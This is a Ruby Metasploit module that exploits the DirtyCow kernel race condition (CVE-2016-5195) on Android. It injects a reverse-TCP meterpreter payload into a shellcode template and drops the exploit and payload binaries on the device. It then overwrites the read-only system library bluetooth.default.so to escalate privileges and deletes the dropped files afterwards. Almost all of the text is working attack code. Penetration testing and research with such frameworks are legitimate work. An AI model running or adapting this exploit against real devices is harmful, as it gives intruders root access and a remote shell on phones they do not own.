##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Common
  include Msf::Exploit::EXE

  def initialize(info={})
    super( update_info( info, {
        'Name'          => "Android DirtyCow Exploit",
        'Description'   => %q{
          A race condition was found in the way the Linux kernel's memory
          subsystem handled the copy-on-write (COW) breakage of private
          read-only memory mappings. An unprivileged local user could use
          this flaw to gain write access to otherwise read-only memory mappings
          and thus increase their privileges on the system.
          The bug has existed since around Linux Kernel 2.6.22 (released in 2007).
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
          'Phil Oester',  # discovery
          'scumjr',       # dirtycow-mem.c
          'timwr',        # metasploit module
        ],
        'References'    =>
        [
          [ 'CVE', '2016-5195' ],
          [ 'URL', 'http://dirtycow.ninja/' ],
          [ 'URL', 'https://gist.github.com/scumjr/17d91f20f73157c722ba2aea702985d2' ],
        ],
        'DisclosureDate' => "Oct 20 2016",
        'SessionTypes'   => [ 'meterpreter' ],
        "Platform"       => [ "android", "linux" ],
        'DefaultOptions' =>
        {
          'PAYLOAD'      => 'linux/armle/mettle/reverse_tcp',
          'WfsDelay'     => 60,
        },
        'DefaultTarget' => 0,
        'Targets'       => [ ['Automatic', { 'Arch' => ARCH_ARMLE }]],
    }))
  end

  def exploit
    local_file = File.join( Msf::Config.data_directory, "exploits", "CVE-2016-5195.elf" )
    exploit_data = File.read(local_file, {:mode => 'rb'})

    local_file = File.join( Msf::Config.data_directory, "exploits", "CVE-2016-5195.so" )
    payload_data = File.read(local_file, {:mode => 'rb'})

    payload_encoded = payload.encoded
    space = 2048

    # Substitute the exploit shellcode with our own
    payload_data.gsub!("\x90" * 4 + "\x00" * (space - 4), payload_encoded)

    p payload_data
    print_status("size #{payload_data.size}")
    #padding = 22040 - payload_data.size
    #padding = 9504 - payload_data.size
    #padding = 87604 - payload_data.size
    #print_status("padding #{padding}")
    #payload_data = payload_data + "\x00" * padding

    workingdir = session.fs.dir.getwd
    exploit_file = "#{workingdir}/#{Rex::Text::rand_text_alpha_lower(5)}"
    payload_file = "#{workingdir}/#{Rex::Text::rand_text_alpha_lower(5)}"
    write_file(exploit_file, exploit_data)
    write_file(payload_file, payload_data)
    cmd_exec("chmod 700 #{exploit_file}")
    cmd_exec("chmod 777 #{payload_file}")

    #cmd = "#{exploit_file} /data/user/0/com.metasploit.stage/files/app_process0 /system/bin/app_process"
    #print_status cmd
    #output = cmd_exec(cmd)
    #print_status output
    
    cmd = "#{exploit_file} #{payload_file} /system/lib/hw/bluetooth.default.so"
    print_status cmd
    output = cmd_exec(cmd)
    print_status output

    session.fs.file.rm(exploit_file)
    session.fs.file.rm(payload_file)
  end

end

